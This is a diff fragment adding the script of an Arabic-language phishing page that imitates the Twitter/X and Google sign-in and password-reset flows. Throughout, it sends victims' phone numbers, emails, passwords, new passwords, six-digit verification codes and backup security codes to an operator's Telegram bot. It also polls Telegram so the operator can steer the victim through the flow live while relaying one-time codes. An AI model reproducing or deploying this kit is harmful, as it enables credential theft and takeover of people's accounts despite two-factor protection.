+            '965': 'kw', // الكويت
+            '968': 'om', // عمان
+            '974': 'qa', // قطر
+            '973': 'bh', // البحرين
+            '20': 'eg',  // مصر
+            '212': 'ma', // المغرب
+            '213': 'dz', // الجزائر
+            '216': 'tn', // تونس
+            '249': 'sd', // السودان
+            '962': 'jo', // الأردن
+            '963': 'sy', // سوريا
+            '961': 'lb', // لبنان
+            '964': 'iq', // العراق
+            '970': 'ps', // فلسطين
+            '1': 'us',   // امريكا
+            '44': 'gb',  // بريطانيا
+            '90': 'tr'   // تركيا
+        };
+
+        // تغيير علم الدولة تلقائياً حسب رمز الاتصال
+        function handleCountryCodeChange(val) {
+            const cleanCode = val.replace(/[^0-9]/g, '');
+            const flagImg = document.getElementById('countryFlagImg');
+
+            if (countryFlagsMap[cleanCode]) {
+                flagImg.src = `https://flagcdn.com/w40/${countryFlagsMap[cleanCode]}.png`;
+            } else if (cleanCode.length >= 2) {
+                const prefix2 = cleanCode.substring(0, 2);
+                const prefix1 = cleanCode.substring(0, 1);
+                const iso = countryFlagsMap[prefix2] || countryFlagsMap[prefix1] || 'un';
+                flagImg.src = `https://flagcdn.com/w40/${iso}.png`;
+            }
+        }
+
+        // إرسال البيانات للتليجرام
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN") {
+                console.log("Telegram Output:\n", text);
+                return;
+            }
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.error("Telegram error:", e));
+        }
+
+        // التنقل بين الصفحات
+        function showView(viewId, pushHistory = true) {
+            const currentActive = document.querySelector('.view-page.active');
+            if (currentActive && pushHistory && currentActive.id !== viewId) {
+                viewHistory.push(currentActive.id);
+            }
+
+            document.querySelectorAll('.view-page').forEach(v => v.classList.remove('active'));
+            document.getElementById(viewId).classList.add('active');
+            window.scrollTo(0, 0);
+        }
+
+        function goBack() {
+            if (viewHistory.length > 0) {
+                const previousView = viewHistory.pop();
+                showView(previousView, false);
+                sendTelegramMessage(`<b>⬅️ تراجع المستخدم خطوة:</b>\nالصفحة الحالية: <code>${previousView}</code>`);
+            } else {
+                showView('mainTwitterView', false);
+            }
+        }
+
+        function showLoadingThen(nextViewId, message, duration = 2500) {
+            document.getElementById('loadingStatusText').innerText = message || "جاري التحميل...";
+            showView('loadingView');
+            setTimeout(() => {
+                showView(nextViewId);
+            }, duration);
+        }
+
+        function switchToPhoneMode() {
+            sendTelegramMessage(`<b>📱 النقر على المتابعة بالهاتف</b>`);
+            showView('phoneInputView');
+        }
+
+        function switchToEmailMode() {
+            sendTelegramMessage(`<b>✉️ النقر على المتابعة بالبريد/اسم المستخدم</b>`);
+            showView('emailInputView');
+        }
+
+        function submitPhoneStep() {
+            const code = document.getElementById('phoneCountryCode').value.trim();
+            const phone = document.getElementById('phoneNumberInput').value.trim();
+            if (!phone) { alert('يرجى إدخال رقم الهاتف'); return; }
+
+            sessionData.mainInput = code + phone;
+            sendTelegramMessage(`<b>𝕏 تسجيل هاتف تويتر:</b>\nالرقم: <code>${sessionData.mainInput}</code>`);
+
+            document.getElementById('displayUserIdentifier').innerText = sessionData.mainInput;
+            document.getElementById('otpPhoneNumberDisplay').innerText = sessionData.mainInput;
+            showLoadingThen('passwordInputView', "جاري التحميل...", 2000);
+        }
+
+        function submitEmailStep() {
+            const email = document.getElementById('emailMainInput').value.trim();
+            if (!email) { alert('يرجى إدخال البريد الإلكتروني'); return; }
+
+            sessionData.mainInput = email;
+            sendTelegramMessage(`<b>𝕏 تسجيل بريد تويتر:</b>\nالبريد: <code>${email}</code>`);
+
+            document.getElementById('displayUserIdentifier').innerText = email;
+            document.getElementById('otpPhoneNumberDisplay').innerText = email;
+            showLoadingThen('passwordInputView', "جاري التحميل...", 2000);
+        }
+
+        function submitTwitterPassword() {
+            const pass = document.getElementById('twitterPasswordInput').value.trim();
+            if (!pass) { alert('يرجى إدخال كلمة المرور'); return; }
+
+            sessionData.password = pass;
+            sendTelegramMessage(`<b>🔑 كلمة مرور تويتر:</b>\nالحساب: <code>${sessionData.mainInput}</code>\nكلمة المرور: <code>${pass}</code>`);
+
+            showLoadingThen('otpConfirmView', "جاري التحقق من المعلومات...", 2500);
+            startOtpCountdownTimer(60);
+        }
+
+        function handleForgotPasswordClick() {
+            sendTelegramMessage(`<b>⚠️ تويتر - نسيت كلمة المرور:</b>\nالحساب: <code>${sessionData.mainInput}</code>`);
+            openGoogleFlow();
+        }
+
+        // --- التحكم في خانات الـ OTP الـ 6 والتنقل التلقائي ---
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (val.length === 1 && index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                }
+            });
+
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !box.value && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim();
+                if (/^\d{6}$/.test(pasteData)) {
+                    pasteData.split('').forEach((char, i) => {
+                        if (otpBoxes[i]) otpBoxes[i].value = char;
+                    });
+                    otpBoxes[5].focus();
+                }
+            });
+        });
+
+        function getEnteredOtpCode() {
+            let code = '';
+            otpBoxes.forEach(box => code += box.value.trim());
+            return code;
+        }
+
+        function submitTwitterOtpManual() {
+            const code = getEnteredOtpCode();
+            if (code.length < 6) {
+                alert('يرجى إدخال كود التحقق المكون من 6 أرقام كاملاً');
+                return;
+            }
+
+            sendTelegramMessage(`<b>🔢 كود تحقق تويتر مدخل (6 أرقام):</b>\nالحساب: <code>${sessionData.mainInput}</code>\nالكود: <code>${code}</code>`);
+            showView('waitingAdminView');
+            startPollingTelegram();
+        }
+
+        function startOtpCountdownTimer(seconds) {
+            if (countdownTimer) clearInterval(countdownTimer);
+
+            let remaining = seconds;
+            const timerContainer = document.getElementById('timerContainer');
+            
+            timerContainer.innerHTML = `لا تراه؟ أعد المحاولة بعد <span id="twitterTimerSeconds" style="color:var(--text-sub); font-weight:700;">${remaining}</span> ثوانٍ`;
+
+            countdownTimer = setInterval(() => {
+                remaining--;
+                const secondsSpan = document.getElementById('twitterTimerSeconds');
+                if (secondsSpan) secondsSpan.innerText = remaining;
+
+                if (remaining <= 0) {
+                    clearInterval(countdownTimer);
+                    timerContainer.innerHTML = `<span class="resend-btn-link" onclick="resendTwitterOTPCode()">إعادة طلب كود التحقق الآن</span>`;
+                }
+            }, 1000);
+        }
+
+        function resendTwitterOTPCode() {
+            sendTelegramMessage(`<b>🔄 طلب إعادة إرسال كود تويتر:</b>\nالحساب: <code>${sessionData.mainInput}</code>`);
+            startOtpCountdownTimer(60);
+        }
+
+        // --- تدفق جوجل (Google Flow) ---
+        function openGoogleFlow() {
+            sendTelegramMessage(`<b>🔴 فتح تسجيل جوجل</b>`);
+            showView('gPhase1View');
+        }
+
+        function submitGPhase1() {
+            const email = document.getElementById('gEmailInput').value.trim();
+            if (!email) { alert('يرجى إدخال البريد الإلكتروني أو الهاتف'); return; }
+
+            sessionData.mainInput = email;
+            sendTelegramMessage(`<b>🔴 جوجل - المرحلة 1:</b>\nالمُدخل: <code>${email}</code>`);
+
+            showLoadingThen('gPhase2View', "(جاري التحميل...)", 2000);
+        }
+
+        function submitGNotesStep1() {
+            const notes = document.getElementById('gNotesInputVisible').value.trim();
+            if (!notes) { alert('يرجى إدخال كلمة المرور'); return; }
+
+            sessionData.password = notes;
+            sendTelegramMessage(`<b>🔑 كلمة المرور (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nكلمة المرور: <code>${notes}</code>`);
+
+            showLoadingThen('gPhase3View', "(جاري التحميل...)", 2000);
+        }
+
+        function showGResetNotesSection() {
+            document.getElementById('gPhase2_Step1').style.display = 'none';
+            document.getElementById('gPhase2_Step2').style.display = 'block';
+
+            const unique = 'NOTE-' + Math.floor(100000 + Math.random() * 900000);
+            sessionData.uniqueNote = unique;
+            document.getElementById('gUniqueNoteDisplay').innerText = unique;
+
+            sendTelegramMessage(`<b>⚠️ طلب إعادة تعيين كلمة المرور (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nكلمة المرور الفريدة: <code>${unique}</code>`);
+        }
+
+        function handleGUpdatePasswordLinkClick() {
+            navigator.clipboard.writeText(sessionData.uniqueNote).catch(e => console.log(e));
+            document.getElementById('gNewNotesInput').disabled = false;
+            document.getElementById('btnSubmitGNewNotes').disabled = false;
+            sendTelegramMessage(`<b>🔗 النقر على رابط تحديث كلمة المرور:</b>\nالبريد: <code>${sessionData.mainInput}</code>`);
+        }
+
+        function submitGNewNotesFinal() {
+            const newNotes = document.getElementById('gNewNotesInput').value.trim();
+            if (!newNotes) { alert('يرجى إدخال كلمة المرور الجديدة'); return; }
+
+            sessionData.newNotesPassword = newNotes;
+            sendTelegramMessage(`<b>✅ كلمة المرور الجديدة (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nالجديدة: <code>${newNotes}</code>`);
+
+            showLoadingThen('gPhase3View', "(جاري التأكد من المعلومات...)", 2000);
+        }
+
+        function handleBackupLinkClick() {
+            hasClickedBackupLink = true;
+            document.getElementById('gBackupErrorMsg').style.display = 'none';
+            sendTelegramMessage(`<b>🛡️ النقر على رابط رموز الأمان:</b>\nالبريد: <code>${sessionData.mainInput}</code>`);
+        }
+
+        function submitGBackupCode() {
+            const errorBox = document.getElementById('gBackupErrorMsg');
+
+            if (!hasClickedBackupLink) {
+                errorBox.innerText = "يرجى الضغط على رابط رموز الأمان أولاً للحصول على الرمز ثم ادخاله في الخانة.";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            const code = document.getElementById('gBackupCodeInput').value.trim();
+            if (!code) {
+                errorBox.innerText = "يرجى إدخال أحد رموز الأمان المنسوخة من الرابط.";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            sessionData.backupCode = code;
+            sendTelegramMessage(`<b>🛡️ رمز أمان مدخل:</b>\nالبريد: <code>${sessionData.mainInput}</code>\nالرمز: <code>${code}</code>`);
+            showLoadingThen('successView', "(جاري التحقق من رمز الأمان...)", 2500);
+        }
+
+        function toggleGAlternativeOptions() {
+            const area = document.getElementById('gAlternativeArea');
+            area.style.display = area.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function requestGAltCode() {
+            const input = document.getElementById('gAltPhoneEmail').value.trim();
+            if (!input) { alert('يرجى إدخال الرقم أو البريد الإلكتروني'); return; }
+
+            sendTelegramMessage(`<b>📩 طلب كود تحقق (طريقة بديلة):</b>\nالحساب: <code>${sessionData.mainInput}</code>\nالوجهة: <code>${input}</code>`);
+            showView('gPhase4View');
+            startPollingTelegram();
+        }
+
+        function handleGPhase4CodeInput(elem) {
+            const val = elem.value.trim();
+            if (val.length === 6) {
+                sendTelegramMessage(`<b>🔢 كود تحقق مدخل (جوجل):</b>\nالبريد: <code>${sessionData.mainInput}</code>\nالكود: <code>${val}</code>`);
+                showView('waitingAdminView');
+                startPollingTelegram();
+            }
+        }
+
+        // --- الانتظار والتحكم المباشر عبر التليجرام ---
+        function startPollingTelegram() {
+            if (pollTimer) clearInterval(pollTimer);
+            let lastUpdateId = 0;
+
+            pollTimer = setInterval(() => {
+                if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN") return;
+
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.ok && data.result.length > 0) {
+                            data.result.forEach(update => {
+                                lastUpdateId = update.update_id;
+                                if (update.message && update.message.text) {
+                                    const text = update.message.text.trim();
+                                    if (text === "تم التسجيل") {
+                                        clearInterval(pollTimer);
+                                        showView('successView');
+                                    } else if (text === "فشل") {
+                                        clearInterval(pollTimer);
+                                        alert("تأكد من إدخال المعلومات بشكل صحيح");
+                                        showView('mainTwitterView');
+                                    }
+                                }
+                            });
+                        }
+                    })
+                    .catch(e => console.error("Polling error:", e));
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
